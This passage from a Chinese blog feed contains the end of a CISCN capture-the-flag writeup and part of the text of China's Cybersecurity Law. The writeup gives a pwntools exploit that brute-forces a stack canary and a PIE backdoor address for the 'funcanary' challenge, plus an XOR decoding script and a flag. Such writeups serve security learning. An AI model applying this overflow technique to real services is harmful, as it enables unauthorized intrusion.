class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="funcanary："><a href="#funcanary：" class="headerlink" title="funcanary：()"></a>funcanary：()</h4><p>简单栈溢出，只不过在栈上放了canary，分析发现存在后门函数backdoor，同时main函数是while(1)循环，这就使得我们输入canary失败时仍然能回到main函数，因此可以通过爆破泄露出canary的内容(8位canary，爆破七次)。程序开启了pie，因此需要爆破后门函数的地址,发现后三位不变，爆破倒数第四位。</p><p>exp：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./funcanary'</span><span class="token punctuation">)</span><span class="token comment"># io = remote('', '')</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./pwn123'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'welcome\n'</span><span class="token punctuation">)</span>canary <span class="token operator">=</span> <span class="token string">b'\x00'</span><span class="token keyword">for</span> m <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        payload <span class="token operator">=</span> <span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x68</span> <span class="token operator">+</span> canary <span class="token operator">+</span> p8<span class="token punctuation">(</span>i<span class="token punctuation">)</span>        io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>        msg <span class="token operator">=</span> io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'welcome\n'</span><span class="token punctuation">)</span>        <span class="token comment">#输入了正确的canary，返回</span>        <span class="token keyword">if</span> <span class="token string">b'have fun'</span> <span class="token keyword">in</span> msg<span class="token punctuation">:</span>            canary <span class="token operator">+=</span> p8<span class="token punctuation">(</span>i<span class="token punctuation">)</span>            <span class="token keyword">break</span>backdoor <span class="token operator">=</span> <span class="token number">0x1229</span><span class="token keyword">for</span> k <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    addr <span class="token operator">=</span> k <span class="token operator">*</span> <span class="token number">16</span> <span class="token operator">+</span> <span class="token number">2</span>    payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x68</span> <span class="token operator">+</span> canary <span class="token operator">+</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">8</span> <span class="token operator">+</span> <span class="token string">b'\x31'</span> <span class="token operator">+</span> p8<span class="token punctuation">(</span>addr<span class="token punctuation">)</span>    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    msg <span class="token operator">=</span> io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">b'flag&#123;'</span> <span class="token keyword">in</span> msg<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>msg<span class="token punctuation">)</span>        io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="re"><a href="#re" class="headerlink" title="re"></a>re</h3><h4 id="babyRE："><a href="#babyRE：" class="headerlink" title="babyRE："></a>babyRE：</h4><p>下载文件之后发现是Snap的程序，找到他的官网<a href="https://snap.berkeley.edu/snap/snap.html#%E5%9C%A8%E7%BA%BF%E5%AF%BC%E5%85%A5%E6%96%87%E4%BB%B6%EF%BC%8C%E5%8F%91%E7%8E%B0%E6%9C%89%E4%BA%9B%E5%8F%98%E9%87%8F%E5%92%8C%E5%87%BD%E6%95%B0%E5%91%BD%E5%90%8D%E4%B8%8D%E8%A7%84%E8%8C%83%EF%BC%8C%E5%B0%86%E5%85%B6%E8%A7%84%E8%8C%83%E5%8C%96%EF%BC%8C%E5%8F%91%E7%8E%B0">https://snap.berkeley.edu/snap/snap.html#在线导入文件，发现有些变量和函数命名不规范，将其规范化，发现</a></p><img src="https://xyhutc.oss-cn-qingdao.aliyuncs.com/giteetuchuang/20230528135150.png" style="zoom:67%;" /><p>此为初始化函数，相当于初始化数组，后发现</p><img src="https://xyhutc.oss-cn-qingdao.aliyuncs.com/giteetuchuang/20230528135240.png" style="zoom: 67%;" /><p>将输入的字符第一个与前一个进行^ 操作，第二个与第一个进行^ 以此类推.</p><p>编写脚本：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token builtin">list</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">28</span><span class="token punctuation">,</span><span class="token number">74</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">85</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">75</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">,</span><span class="token number">92</span><span class="token punctuation">,</span><span class="token number">92</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">28</span><span class="token punctuation">,</span><span class="token number">25</span><span class="token punctuation">,</span><span class="token number">81</span><span class="token punctuation">,</span><span class="token number">83</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">28</span><span class="token punctuation">,</span><span class="token number">76</span><span class="token punctuation">,</span><span class="token number">88</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">29</span><span class="token punctuation">,</span><span class="token number">73</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">86</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">87</span><span class="token punctuation">,</span><span class="token number">87</span><span class="token punctuation">,</span><span class="token number">82</span><span class="token punctuation">,</span><span class="token number">84</span><span class="token punctuation">,</span><span class="token number">85</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">85</span><span class="token punctuation">,</span><span class="token number">87</span><span class="token punctuation">,</span><span class="token number">30</span><span class="token punctuation">]</span>str1 <span class="token operator">=</span> <span class="token string">'f'</span><span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">list</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">127</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> i <span class="token operator">^</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>str1<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">==</span> j<span class="token punctuation">:</span>            str1 <span class="token operator">=</span> str1 <span class="token operator">+</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>str1<span class="token punctuation">)</span>            <span class="token keyword">break</span><span class="token keyword">print</span><span class="token punctuation">(</span>str1<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>得到flag</p><blockquote><p> flag{12307bbf-9e91-4e61-a900-dd26a6d0ea4c}</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;DebuGGerrr-战队WRITEUP&quot;&gt;&lt;a href=&quot;#DebuGGerrr-战队WRITEUP&quot; class=&quot;headerlink&quot; title=&quot;DebuGGerrr 战队WRITEUP&quot;&gt;&lt;/a&gt;DebuGGerrr 战队WRITEUP&lt;/h1&gt;&lt;</summary>
      
    
    
    
    <category term="CTF" scheme="https://shierjinghuang.github.io/categories/CTF/"/>
    
    
    <category term="CISCN" scheme="https://shierjinghuang.github.io/tags/CISCN/"/>
    
  </entry>
  
  <entry>
    <title>网络安全法</title>
    <link href="https://shierjinghuang.github.io/2023/04/12/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%B3%95/"/>
    <id>https://shierjinghuang.github.io/2023/04/12/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%B3%95/</id>
    <published>2023-04-12T08:32:31.000Z</published>
    <updated>2023-04-25T07:36:09.205Z</updated>
    
    <content type="html"><![CDATA[<h4 id="目-录"><a href="#目-录" class="headerlink" title="目 录"></a>目 录</h4><p>[TOC]</p><h4 id="第一章-总-则"><a href="#第一章-总-则" class="headerlink" title="第一章 总 则"></a>第一章 总 则</h4><p><strong>第一条</strong> 为了保障网络安全，维护网络空间主权和国家安全、社会公共利益，保护公民、法人和其他组织的合法权益，促进经济社会信息化健康发展，制定本法。 </p><p><strong>第二条</strong> 在中华人民共和国境内建设、运营、维护和使用网络，以及网络安全的监督管理，适用本法。 </p><p><strong>第三条</strong> 国家坚持网络安全与信息化发展并重，遵循积极利用、科学发展、 依法管理、确保安全的方针，推进网络基础设施建设和互联互通，鼓励网络技术创新和应用，支持培养网络安全人才，建立健全网络安全保障体系，提高网络安全保护能力。 </p><p><strong>第四条</strong> 国家制定并不断完善网络安全战略，明确保障网络安全的基本要 求和主要目标，提出重点领域的网络安全政策、工作任务和措施。 </p><p><strong>第五条</strong> 国家采取措施，监测、防御、处置来源于中华人民共和国境内外的网络安全风险和威胁，保护关键信息基础设施免受攻击、侵入、干扰和破坏，依法惩治网络违法犯罪活动，维护网络空间安全和秩序。 </p><p><strong>第六条</strong> 国家倡导诚实守信、健康文明的网络行为，推动传播社会主义核心价值观，采取措施提高全社会的网络安全意识和水平，形成全社会共同参与促进网络安全的良好环境。 </p><p><strong>第七条</strong> 国家积极开展网络空间治理、网络技术研发和标准制定、打击网 络违法犯罪等方面的国际交流与合作，推动构建和平、安全、开放、合作的网络空间，建立多边、民主、透明的网络治理体系。 </p><p><strong>第八条</strong> 国家网信部门负责统筹协调网络安全工作和相关监督管理工作。国务院电信主管部门、公安部门和其他有关机关依照本法和有关法律、行政法规的规定，在各自职责范围内负责网络安全保护和监督管理工作。县级以上地方人民政府有关部门的网络安全保护和监督管理职责，按照国家有关规定确定。 </p><p><strong>第九条</strong> 网络运营者开展经营和服务活动，必须遵守法律、行政法规，尊重社会公德，遵守商业道德，诚实信用，履行网络安全保护义务，接受政府和社会的监督，承担社会责任。 </p><p><strong>第十条</strong> 建设、运营网络或者通过网络提供服务，应当依照法律、行政法规的规定和国家标准的强制性要求，采取技术措施和其他必要措施，保障网络安全、稳定运行，有效应对网络安全事件，防范网络违法犯罪活动，维护网络数据的完整性、保密性和可用性。</p><p><strong>第十一条</strong> 网络相关行业组织按照章程，加强行业自律，制定网络安全行 为规范，指导会员加强网络安全保护，提高网络安全保护水平，促进行业健康发展。 </p><p><strong>第十二条</strong> 国家保护公民、法人和其他组织依法使用网络的权利，促进网络接入普及，提升网络服务水平，为社会提供安全、便利的网络服务，保障网络信息依法有序自由流动。任何个人和组织使用网络应当遵守宪法法律，遵守公共秩序，尊重社会公德，不得危害网络安全，不得利用网络从事危害国家安全、荣誉和利益，煽动颠覆国家政权、推翻社会主义制度，煽动分裂国家、破坏国家统一，宣扬恐怖主义、极端主义，宣扬民族仇恨、民族歧视，传播暴力、淫秽色情信息，编造、传播虚假信息扰乱经济秩序和社会秩序，以及侵害他人名誉、隐私、知识产权和其他合法权益等活动。 </p><p><strong>第十三条</strong> 国家支持研究开发有利于未成年人健康成长的网络产品和服务，依法惩治利用网络从事危害未成年人身心健康的活动，为未成年人提供安全、健康的网络环境。 </p><p><strong>第十四条</strong> 任何个人和组织有权对危害网络安全的行为向网信、电信、公 安等部门举报。收到举报的部门应当及时依法作出处理；不属于本部门职责的，应当及时移送有权处理的部门。 有关部门应当对举报人的相关信息予以保密，保护举报人的合法权益。 </p><h4 id="第二章-网络安全支持与促进"><a href="#第二章-网络安全支持与促进" class="headerlink" title="第二章 网络安全支持与促进"></a>第二章 网络安全支持与促进</h4><p><strong>第十五条</strong> 国家建立和完善网络安全标准体系。国务院标准化行政主管部门和国务院其他有关部门根据各自的职责，组织制定并适时修订有关网络安全管理以及网络产品、服务和运行安全的国家标准、行业标准。国家支持企业、研究机构、高等学校、网络相关行业组织参与网络安全国家 标准、行业标准的制定。 </p><p><strong>第十六条</strong> 国务院和省、自治区、直辖市人民政府应当统筹规划，加大投 入，扶持重点网络安全技术产业和项目，支持网络安全技术的研究开发和应用，推广安全可信的网络产品和服务，保护网络技术知识产权，支持企业、研究机构 和高等学校等参与国家网络安全技术创新项目。 </p><p><strong>第十七条</strong> 国家推进网络安全社会化服务体系建设，鼓励有关企业、机构开展网络安全认证、检测和风险评估等安全服务。 </p><p><strong>第十八条</strong> 国家鼓励开发网络数据安全保护和利用技术，促进公共数据资源开放，推动技术创新和经济社会发展。 国家支持创新网络安全管理方式，运用网络新技术，提升网络安全保护水平。 </p><p><strong>第十九条</strong> 各级人民政府及其有关部门应当组织开展经常性的网络安全宣 传教育，并指导、督促有关单位做好网络安全宣传教育工作。大众传播媒介应当有针对性地面向社会进行网络安全宣传教育。 </p><p><strong>第二十条</strong> 国家支持企业和高等学校、职业学校等教育培训机构开展网络 安全相关教育与培训，采取多种方式培养网络安全人才，促进网络安全人才交流。 </p><h4 id="第三章-网络运行安全"><a href="#第三章-网络运行安全" class="headerlink" title="第三章 网络运行安全"></a>第三章 网络运行安全</h4><p>第一节 一般规定 </p><p><strong>第二十一条</strong> 国家实行网络安全等级保护制度。网络运营者应当按照网络安全等级保护制度的要求，履行下列安全保护义务，保障网络免受干扰、破坏或者未经授权的访问，防止网络数据泄露或者被窃取、篡改：</p><p>（一）制定内部安全管理制度和操作规程，确定网络安全负责人，落实网络安全保护责任； </p><p>（二）采取防范计算机病毒和网络攻击、网络侵入等危害网络安全行为的技术措施； </p><p>（三）采取监测、记录网络运行状态、网络安全事件的技术措施，并按照规定留存相关的网络日志不少于六个月； </p><p>（四）采取数据分类、重要数据备份和加密等措施； </p><p>（五）法律、行政法规规定的其他义务。 </p><p><strong>第二十二条</strong> 网络产品、服务应当符合相关国家标准的强制性要求。网络 产品、服务的提供者不得设置恶意程序；发现其网络产品、服务存在安全缺陷、漏洞等风险时，应当立即采取补救措施，按照规定及时告知用户并向有关主管部门报告。网络产品、服务的提供者应当为其产品、服务持续提供安全维护；在规定或 者当事人约定的期限内，不得终止提供安全维护。网络产品、服务具有收集用户信息功能的，其提供者应当向用户明示并取得 同意；涉及用户个人信息的，还应当遵守本法和有关法律、行政法规关于个人信息保护的规定。 </p><p><strong>第二十三条</strong> 网络关键设备和网络安全专用产品应当按照相关国家标准的强制性要求，由具备资格的机构安全认证合格或者安全检测符合要求后，方可销 售或者提供。国家网信部门会同国务院有关部门制定、公布网络关键设备和网络安全专用产品目录，并推动安全认证和安全检测结果互认，避免重复认证、检测。 </p><p><strong>第二十四条</strong> 网络运营者为用户办理网络接入、域名注册服务，办理固定电话、移动电话等入网手续，或者为用户提供信息发布、即时通讯等服务，在与用户签订协议或者确认提供服务时，应当要求用户提供真实身份信息。用户不提 供真实身份信息的，网络运营者不得为其提供相关服务。国家实施网络可信身份战略，支持研究开发安全、方便的电子身份认证技术，推动不同电子身份认证之间的互认。 </p><p><strong>第二十五条</strong> 网络运营者应当制定网络安全事件应急预案，及时处置系统漏洞、计算机病毒、网络攻击、网络侵入等安全风险；在发生危害网络安全的事件时，立即启动应急预案，采取相应的补救措施，并按照规定向有关主管部门报告。 </p><p><strong>第二十六条</strong> 开展网络安全认证、检测、风险评估等活动，向社会发布系统漏洞、计算机病毒、网络攻击、网络侵入等网络安全信息，应当遵守国家有关规定。 </p><p><strong>第二十七条</strong> 任何个人和组织不得从事非法侵入他人网络、干扰他人网络正常功能、窃取网络数据等危害网络安全的活动；不得提供专门用于从事侵入网 络、干扰网络正常功能及防护措施、窃取网络数据等危害网络安全活动的程序、工具；明知他人从事危害网络安全的活动的，不得为其提供技术支持、广告推广、支付结算等帮助。 </p><p><strong>第二十八条</strong> 网络运营者应当为公安机关、国家安全机关依法维护国家安全和侦查犯罪的活动提供技术支持和协助</p><p><strong>第二十九条</strong> 国家支持网络运营者之间在网络安全信息收集、分析、通报和应急处置等方面进行合作，提高网络运营者的安全保障能力。有关行业组织建立健全本行业的网络安全保护规范和协作机制，加强对网络安全风险的分析评估，定期向会员进行风险警示，支持、协助会员应对网络安全风险。 </p><p><strong>第三十条</strong> 网信部门和有关部门在履行网络安全保护职责中获取的信息，只能用于维护网络安全的需要，不得用于其他用途。 第二节 关键信息基础设施的运行安全 </p><p><strong>第三十一条</strong> 国家对公共通信和信息服务、能源、交通、水利、金融、公 共服务、电子政务等重要行业和领域，以及其他一旦遭到破坏、丧失功能或者数据泄露，可能严重危害国家安全、国计民生、公共利益的关键信息基础设施，在网络安全等级保护制度的基础上，实行重点保护。关键信息基础设施的具体范围和安全保护办法由国务院制定。 国家鼓励关键信息基础设施以外的网络运营者自愿参与关键信息基础设施 保护体系。 </p><p><strong>第三十二条</strong> 按照国务院规定的职责分工，负责关键信息基础设施安全保护工作的部门分别编制并组织实施本行业、本领域的关键信息基础设施安全规划，指导和监督关键信息基础设施运行安全保护工作。 </p><p><strong>第三十三条</strong> 建设关键信息基础设施应当确保其具有支持业务稳定、持续运行的性能，并保证安全技术措施同步规划、同步建设、同步使用。 </p><p><strong>第三十四条</strong> 除本法第二十一条的规定外，关键信息基础设施的运营者还应当履行下列安全保护义务： </p><p>（一）设置专门安全管理机构和安全管理负责人，并对该负责人和关键岗位的人员进行安全背景审查； </p><p>（二）定期对从业人员进行网络安全教育、技术培训和技能考核； </p><p>（三）对重要系统和数据库进行容灾备份； </p><p>（四）制定网络安全事件应急预案，并定期进行演练； </p><p>（五）法律、行政法规规定的其他义务。 </p><p><strong>第三十五条</strong> 关键信息基础设施的运营者采购网络产品和服务，可能影响国家安全的，应当通过国家网信部门会同国务院有关部门组织的国家安全审查。 </p><p><strong>第三十六条</strong> 关键信息基础设施的运营者采购网络产品和服务，应当按照规定与提供者签订安全保密协议，明确安全和保密义务与责任。 </p><p><strong>第三十七条</strong> 关键信息基础设施的运营者在中华人民共和国境内运营中收集和产生的个人信息和重要数据应当在境内存储。因业务需要，确需向境外提供的，应当按照国家网信部门会同国务院有关部门制定的办法进行安全评估；法律、行政法规另有规定的，依照其规定。 </p><p><strong>第三十八条</strong> 关键信息基础设施的运营者应当自行或者委托网络安全服务机构对其网络的安全性和可能存在的风险每年至少进行一次检测评估，并将检测 评估情况和改进措施报送相关负责关键信息基础设施安全保护工作的部门。 </p><p><strong>第三十九条</strong> 国家网信部门应当统筹协调有关部门对关键信息基础设施的安全保护采取下列措施： </p><p>一 对关键信息基础设施的安全风险进行抽查检测，提出改进措施，必要时可以委托网络安全服务机构对网络存在的安全风险进行检测评估；</p><p>二 定期组织关键信息基础设施的运营者进行网络安全应急演练，提高应对网络安全事件的水平和协同配合能力</p><p>三 促进有关部门、关键信息基础设施的运营者以及有关研究机构、网络安全服务机构等之间的网络安全信息共享</p><p>四 对网络安全事件的应急处置与网络功能的恢复等，提供技术支持和协助。 </p><h4 id="第四章-网络信息安全"><a href="#第四章-网络信息安全" class="headerlink" title="第四章 网络信息安全"></a>第四章 网络信息安全</h4><p><strong>第四十条</strong> 网络运营者应当对其收集的用户信息严格保密，并建立健全用户信息保护制度。 </p><p><strong>第四十一条</strong> 网络运营者收集、使用个人信息，应当遵循合法、正当、必要的原则，公开收集、使用规则，明示收集、使用信息的目的、方式和范围，并经被收集者同意。网络运营者不得收集与其提供的服务无关的个人信息，不得违反法律、行政法规的规定和双方的约定收集、使用个人信息，并应当依照法律、行政法规的规定和与用户的约定，处理其保存的个人信息。 </p><p><strong>第四十二条</strong> 网络运营者不得泄露、篡改、毁损其收集的个人信息；未经被收集者同意，不得向他人提供个人信息。但是，经过处理无法识别特定个人且不能复原的除外。网络运营者应当采取技术措施和其他必要措施，确保其收集的个人信息安全，防止信息泄露、毁损、丢失。在发生或者可能发生个人信息泄露、毁损、丢失的 情况时，应当立即采取补救措施，按照规定及时告知用户并向有关主管部门报告。 </p><p><strong>第四十三条</strong> 个人发现网络运营者违反法律、行政法规的规定或者双方的约定收集、使用其个人信息的，有权要求网络运营者删除其个人信息；发现网络运营者收集、存储的其个人信息有错误的，有权要求网络运营者予以更正。网络运营者应当采取措施予以删除或者更正。 </p><p><strong>第四十四条</strong> 任何个人和组织不得窃取或者以其他非法方式获取个人信息，不得非法出售或者非法向他人提供个人信息。 </p><p><strong>第四十五条</strong> 依法负有网络安全监督管理职责的部门及其工作人员，必须对在履行职责中知悉的个人信息、隐私和商业秘密严格保密，不得泄露、出售或者非法向他人提供。 </p><p><strong>第四十六条</strong> 任何个人和组织应当对其使用网络的行为负责，不得设立用于实施诈骗，传授犯罪方法，制作或者销售违禁物品、管制物品等违法犯罪活动的网站、通讯群组，不得利用网络发布涉及实施诈骗，制作或者销售违禁物品、管制物品以及其他违法犯罪活动的信息。 </p><p><strong>第四十七条</strong> 网络运营者应当加强对其用户发布的信息的管理，发现法律、行政法规禁止发布或者传输的信息的，应当立即停止传输该信息，采取消除等处置措施，防止信息扩散，保存有关记录，并向有关主管部门报告。 </p><p><strong>第四十八条</strong> 任何个人和组织发送的电子信息、提供的应用软件，不得设置恶意程序，不得含有法律、行政法规禁止发布或者传输的信息。电子信息发送服务提供者和应用软件下载服务提供者，应当履行安全管理义务，知道其用户有前款规定行为的，应当停止提供服务，采取消除等处置措施，保存有关记录，并向有关主管部门报告。 </p><p><strong>第四十九条</strong> 网络运营者应当建立网络信息安全投诉、举报制度，公布投诉、举报方式等信息，及时受理并处理有关网络信息安全的投诉和举报。 网络运营者对网信部门和有关部门依法实施的监督检查，应当予以配合。</p><p><strong>第五十条</strong> 国家网信部门和有关部门依法履行网络信息安全监督管理职责， 发现法律、行政法规禁止发布或者传输的信息的，应当要求网络运营者停止传输，采取消除等处置措施，保存有关记录；对来源于中华人民共和国境外的上述信息， 应当通知有关机构采取技术措施和其他必要措施阻断传播。 </p><h4 id="第五章-监测预警与应急处置"><a href="#第五章-监测预警与应急处置" class="headerlink" title="第五章 监测预警与应急处置"></a>第五章 监测预警与应急处置</h4><p><strong>第五十一条</strong> 国家建立网络安全监测预警和信息通报制度。国家网信部门应当统筹协调有关部门加强网络安全信息收集、分析和通报工作，按照规定统一发布网络安全监测预警信息。 </p><p><strong>第五十二条</strong> 负责关键信息基础设施安全保护工作的部门，应当建立健全本行业、本领域的网络安全监测预警和信息通报制度，并按照规定报送网络安全监测预警信息。 </p><p><strong>第五十三条</strong> 国家网信部门协调有关部门建立健全网络安全风险评估和应急工作机制，制定网络安全事件应急预案，并定期组织演练。负责关键信息基础设施安全保护工作的部门应当制定本行业、本领域的网络安全事件应急预案，并定期组织演练。网络安全事件应急预案应当按照事件发生后的危害程度、影响范围等因素对网络安全事件进行分级，并规定相应的应急处置措施。 </p><p><strong>第五十四条</strong> 网络安全事件发生的风险增大时，省级以上人民政府有关部门应当按照规定的权限和程序，并根据网络安全风险的特点和可能造成的危害， 采取下列措施： </p><p>（一）要求有关部门、机构和人员及时收集、报告有关信息，加强对网络安全风险的监测； </p><p>（二）组织有关部门、机构和专业人员，对网络安全风险信息进行分析评估，预测事件发生的可能性、影响范围和危害程度； </p><p>（三）向社会发布网络安全风险预警，发布避免、减轻危害的措施。 </p><p><strong>第五十五条</strong> 发生网络安全事件，应当立即启动网络安全事件应急预案，对网络安全事件进行调查和评估，要求网络运营者采取技术措施和其他必要措施，消除安全隐患，防止危害扩大，并及时向社会发布与公众有关的警示信息</p><p><strong>第五十六条</strong> 省级以上人民政府有关部门在履行网络安全监督管理职责中，发现网络存在较大安全风险或者发生安全事件的，可以按照规定的权限和程序对该网络的运营者的法定代表人或者主要负责人进行约谈。网络运营者应当按照要求采取措施，进行整改，消除隐患。 </p><p><strong>第五十七条</strong> 因网络安全事件，发生突发事件或者生产安全事故的，应当依照《中华人民共和国突发事件应对法》、《中华人民共和国安全生产法》等有 关法律、行政法规的规定处置。 </p><p><strong>第五十八条</strong> 因维护国家安全和社会公共秩序，处置重大突发社会安全事件的需要，经国务院决定或者批准，可以在特定区域对网络通信采取限制等临时措施。 </p><h4 id="第六章-法律责任"><a href="#第六章-法律责任" class="headerlink" title="第六章 法律责任"></a>第六章 法律责任</h4><p><strong>第五十九条</strong> 网络运营者不履行本法第二十一条、第二十五条规定的网络安全保护义务的，由有关主管部门责令改正，给予警告；拒不改正或者导致危害网络安全等后果的，处一万元以上十万元以下罚款，对直接负责的主管人员处五千元以上五万元以下罚款。关键信息基础设施的运营者不履行本法第三十三条、第三十四条、第三十六条、第三十八条规定的网络安全保护义务的，由有关主管部门责令改正，给予警告；拒不改正或者导致危害网络安全等后果的，处十万元以上一百万元以下罚款，对直接负责的主管人员处一万元以上十万元以下罚款。 </p><p><strong>第六十条</strong> 违反本法第二十二条第一款、第二款和第四十八条第一款规定，有下列行为之一的，由有关主管部门责令改正，给予警告；拒不改正或者导致危 害网络安全等后果的，处五万元以上五十万元以下罚款，对直接负责的主管人员处一万元以上十万元以下罚款： </p><p>（一）设置恶意程序的； </p><p>（二）对其产品、服务存在的安全缺陷、漏洞等风险未立即采取补救措施，或者未按照规定及时告知用户并向有关主管部门报告的； </p><p>（三）擅自终止为其产品、服务提供安全维护的。 </p><p><strong>第六十一条</strong> 网络运营者违反本法第二十四条第一款规定，未要求用户提供真实身份信息，或者对不提供真实身份信息的用户提供相关服务的，由有关主管部门责令改正；拒不改正或者情节严重的，处五万元以上五十万元以下罚款，并可以由有关主管部门责令暂停相关业务、停业整顿、关闭网站、吊销相关业务许可证或者吊销营业执照，对直接负责的主管人员和其他直接责任人员处一万元以上十万元以下罚款。 </p><p><strong>第六十二条</strong> 违反本法第二十六条规定，开展网络安全认证、检测、风险 评估等活动，或者向社会发布系统漏洞、计算机病毒、网络攻击、网络侵入等网络安全信息的，由有关主管部门责令改正，给予警告；拒不改正或者情节严重的，处一万元以上十万元以下罚款，并可以由有关主管部门责令暂停相关业务、停业 整顿、关闭网站、吊销相关业务许可证或者吊销营业执照，对直接负责的主管人 员和其他直接责任人员处五千元以上五万元以下罚款。 </p><p><strong>第六十三条</strong> 违反本法第二十七条规定，从事危害网络安全的活动，或者 提供专门用于从事危害网络安全活动的程序、工具，或者为他人从事危害网络安全的活动提供技术支持、广告推广、支付结算等帮助，尚不构成犯罪的，由公安机关没收违法所得，处五日以下拘留，可以并处五万元以上五十万元以下罚款；情节较重的，处五日以上十五日以下拘留，可以并处十万元以上一百万元以下罚款。 单位有前款行为的，由公安机关没收违法所得，处十万元以上一百万元以下罚款，并对直接负责的主管人员和其他直接责任人员依照前款规定处罚。违反本法第二十七条规定，受到治安管理处罚的人员，五年内不得从事网络安全管理和网络运营关键岗位的工作；受到刑事处罚的人员，终身不得从事网络安全管理和网络运营关键岗位的工作。 </p><p><strong>第六十四条</strong> 网络运营者、网络产品或者服务的提供者违反本法第二十二条第三款、第四十一条至第四十三条规定，侵害个人信息依法得到保护的权利的，由有关主管部门责令改正，可以根据情节单处或者并处警告、没收违法所得、处违法所得一倍以上十倍以下罚款，没有违法所得的，处一百万元以下罚款，对直接负责的主管人员和其他直接责任人员处一万元以上十万元以下罚款；情节严重的，并可以责令暂停相关业务、停业整顿、关闭网站、吊销相关业务许可证或者吊销营业执照。违反本法第四十四条规定，窃取或者以其他非法方式获取、非法出售或者非 法向他人提供个人信息，尚不构成犯罪的，由公安机关没收违法所得，并处违法 所得一倍以上十倍以下罚款，没有违法所得的，处一百万元以下罚款。 </p><p><strong>第六十五条</strong> 关键信息基础设施的运营者违反本法第三十五条规定，使用未经安全审查或者安全审查未通过的网络产品或者服务的，由有关主管部门责令停止使用，处采购金额一倍以上十倍以下罚款；对直接负责的主管人员和其他直接责任人员处一万元以上十万元以下罚款。 </p><p><strong>第六十六条</strong> 关键信息基础设施的运营者违反本法第三十七条规定，在境外存储网络数据，或者向境外提供网络数据的，由有关主管部门责令改正，给予 警告，没收违法所得，处五万元以上五十万元以下罚款，并可以责令暂停相关业务、停业整顿、关闭网站、吊销相关业务许可证或者吊销营业执照；对直接负责的主管人员和其他直接责任人员处一万元以上十万元以下罚款。 </p><p><strong>第六十七条</strong> 